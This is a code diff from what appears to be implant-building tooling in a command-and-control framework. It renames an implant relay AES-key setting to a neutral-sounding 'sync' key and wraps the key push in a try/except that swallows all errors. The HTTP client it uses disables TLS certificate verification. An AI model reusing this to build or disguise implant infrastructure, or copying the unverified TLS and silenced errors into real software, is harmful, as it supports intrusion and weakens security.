@@ -16,7 +16,7 @@ async def push_aes_key(tag, body):
         return
     rows = await sqlite_db.read(AesKeys, tag=tag)
     key = rows[0].key if rows else ""
-    shared = str((config.get("implants") or {}).get("relay_aes_key") or "").strip()
+    shared = str((config.get("config") or {}).get("sync_aes_key") or "").strip()
     if not key or not shared:
         return
     async with httpx.AsyncClient(verify=False, timeout=10) as client:
@@ -35,5 +35,8 @@ async def main(body):
     tag = generate_tag()
     result = await compile_implant(body, tag)
     if isinstance(result, dict) and result.get("status") == "success":
-        await push_aes_key(tag, body)
+        try:
+            await push_aes_key(tag, body)
+        except Exception:
+            pass
     return result
